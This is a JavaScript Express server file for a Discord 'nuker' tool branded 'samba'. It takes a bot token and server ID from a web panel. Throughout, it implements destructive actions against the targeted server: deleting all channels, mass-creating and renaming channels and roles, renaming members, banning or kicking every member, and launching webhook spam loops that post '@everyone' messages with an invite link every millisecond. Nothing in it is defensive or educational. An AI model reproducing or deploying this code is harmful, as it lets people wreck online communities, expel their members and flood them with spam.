// language: JavaScript, file: server.js, target: Node.js Backend
const express = require('express');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const activeSpamMap = new Map();

app.post('/api/execute', async (req, res) => {
    let { token, guildId, targetName, webhookName, spamMessage, action } = req.body;
    
    if (!token || !guildId) {
        return res.status(400).json({ success: false, error: 'Token and Guild ID are required.' });
    }

    guildId = guildId.trim().replace(/\D/g, '').slice(0, 19);

    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages 
        ] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);

        // دالة الويبهوكات والسبام الفوري الخارق
        async function triggerInstantSpam() {
            const channels = guild.channels.cache.filter(c => c.type === 0);
            for (const [id, ch] of channels) {
                let webhook = await ch.createWebhook({ name: webhookName || 'samba-Spam' }).catch(() => {});
                if (webhook) {
                    let spaming = setInterval(async () => {
                        await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91 ON TOP').catch(() => {});
                    }, 1); // أسرع سبام في العالم
                    activeSpamMap.set(ch.id, spaming);
                }
            }
        }

        if (action === 'create_channels') {
            for (let i = 0; i < 40; i++) {
                await guild.channels.create({ name: targetName }).catch(() => {});
            }
            await triggerInstantSpam();
            res.json({ success: true, message: `[samba] Channels created & instant webhook spam active!` });

        } else if (action === 'delete_channels') {
            const deletePromises = [];
            guild.channels.cache.forEach(ch => deletePromises.push(ch.delete().catch(() => {})));
            await Promise.all(deletePromises);
            res.json({ success: true, message: `[samba] All channels deleted successfully.` });

        } else if (action === 'rename_channels') {
            const channels = guild.channels.cache.filter(c => c.type === 0);
            const renamePromises = [];
            channels.forEach(ch => renamePromises.push(ch.setName(targetName).catch(() => {})));
            await Promise.all(renamePromises);
            // تعديل الأسماء يفجر الويبهوكات والسبام الفوري تلقائياً
            await triggerInstantSpam();
            res.json({ success: true, message: `[samba] Channels renamed & instant webhook spam triggered!` });

        } else if (action === 'create_roles') {
            for (let i = 0; i < 30; i++) {
                await guild.roles.create({ name: targetName }).catch(() => {});
            }
            res.json({ success: true, message: `[samba] Roles created successfully.` });

        } else if (action === 'delete_roles') {
            guild.roles.cache.forEach(role => {
                if (role.editable && role.name !== '@everyone') role.delete().catch(() => {});
            });
            res.json({ success: true, message: `[samba] Roles deleted successfully.` });

        } else if (action === 'rename_roles') {
            guild.roles.cache.forEach(role => {
                if (role.editable && role.name !== '@everyone') role.setName(targetName).catch(() => {});
            });
            res.json({ success: true, message: `[samba] Roles renamed successfully.` });

        } else if (action === 'rename_server') {
            await guild.setName(targetName).catch(() => {});
            res.json({ success: true, message: `[samba] Server renamed to ${targetName}.` });

        } else if (action === 'rename_members') {
            const members = await guild.members.fetch();
            members.forEach(m => m.setNickname(targetName).catch(() => {}));
            res.json({ success: true, message: `[samba] All members renamed!` });

        } else if (action === 'start_webhook_spam') {
            await triggerInstantSpam();
            res.json({ success: true, message: `[samba] Infinite webhook spam activated!` });

        } else if (action === 'stop_all_spam') {
            activeSpamMap.forEach((intervalId) => clearInterval(intervalId));
            activeSpamMap.clear();
            res.json({ success: true, message: `[samba] All spam loops terminated.` });

        } else if (action === 'ban_all') {
            const members = await guild.members.fetch();
            members.forEach(m => m.ban().catch(() => {}));
            res.json({ success: true, message: `[samba] Banned all members.` });

        } else if (action === 'kick_all') {
            const members = await guild.members.fetch();
            members.forEach(m => m.kick().catch(() => {}));
            res.json({ success: true, message: `[samba] Kicked all members.` });
        }

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[samba] Control Engine online on port ${PORT}`);
});
